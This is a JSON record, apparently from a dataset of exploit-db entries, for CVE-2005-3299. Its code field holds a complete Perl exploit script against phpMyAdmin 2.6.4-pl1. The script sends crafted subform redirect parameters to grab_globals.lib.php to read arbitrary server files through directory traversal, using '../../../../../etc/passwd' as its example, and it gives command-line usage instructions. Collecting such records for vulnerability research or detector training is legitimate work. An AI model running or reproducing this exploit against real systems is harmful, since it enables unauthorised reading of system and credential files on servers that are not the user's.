{
  "id": "1244",
  "title": "phpMyAdmin 2.6.4-pl1 - Directory Traversal",
  "cve": "CVE-2005-3299",
  "vuln_type": "path_traversal",
  "code": "#!/usr/bin/perl\r\nuse IO::Socket;\r\n\r\n# SecurityReason.com TEAM\r\n# Maksymilian Arciemowicz ( cXIb8O3 ) cxib@securtiyreason.com\r\n#\r\n# Local file inclusion (./$FILE)\r\n# simple exploit phpMyAdmin 2.6.4-pl1\r\n#\r\n#\r\n# SecurityReason.com\r\n\r\nif (@ARGV < 3)\r\n{\r\nprint \"\\r\\n SecurityReason TEAM\\r\\n\";\r\nprint \"[cXIb8O3] EXPLOIT for phpMyAdmin 2.6.4-pl1\\r\\n\";\r\nprint \" \\r\\n\";\r\nprint \"perl phpmyadmin-2.6.4-pl1.pl HOST /DIR/ FILE\\r\\n\\r\\n\";\r\nprint \"HOST - Host where is phpmyadmin example: http://localhost\\r\\n\";\r\nprint \"DIR - Directory to PMA example: /phpMyAdmin-2.6.4-pl1/\\r\\n\";\r\nprint \"FILE - file to inclusion ../../../../../etc/passwd\\r\\n\\r\\n\";\r\nprint \"example cmd: perl phpmyadmin-2.6.4-pl1.pl http://localhost /phpMyAdmin-2.6.4-pl1/ ../../../../../etc/passwd\\r\\n\\r\\n\";\r\nexit();\r\n}\r\n\r\n$HOST = $ARGV[0];\r\n$DIR = $ARGV[1].\"libraries/grab_globals.lib.php\";\r\n$FILE = \"usesubform[1]=1&usesubform[2]=1&subform[1][redirect]=\".$ARGV[2].\"&subform[1][cXIb8O3]=1\";\r\n$LENGTH = length $FILE;\r\n\r\nprint \"\\r\\nATTACK HOST IS: \".$HOST.\"\\r\\n\\r\\n\";\r\n$HOST =~ s/(http:\\/\\/)//;\r\n\r\n$get1 = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$HOST\", PeerPort => \"80\") || die \"Error 404\\r\\n\\r\\n\";\r\n\r\nprint $get1 \"POST \".$DIR.\" HTTP/1.0\\n\";\r\nprint $get1 \"Host: \".$HOST.\"\\n\";\r\nprint $get1 \"Content-Type: application/x-www-form-urlencoded\\n\";\r\nprint $get1 \"Content-Length: \".$LENGTH.\"\\n\\n\";\r\n\r\nprint $get1 $FILE;\r\n\r\nwhile ($odp = <$get1>)\r\n{\r\nif ($odp =~ /<b>Warning<\\/b>: main\\(\\): Unable to access .\\/$ARGV[2] in <b>/ ) {\r\nprintf \"\\n\\nFile \".$ARGV[2].\" no exists.\\r\\n\\r\\n\";\r\nexit;\r\n}\r\n\r\nprintf $odp;\r\n}\r\n\r\n# milw0rm.com [2005-10-10]",
  "url": "https://www.exploit-db.com/exploits/1244"
}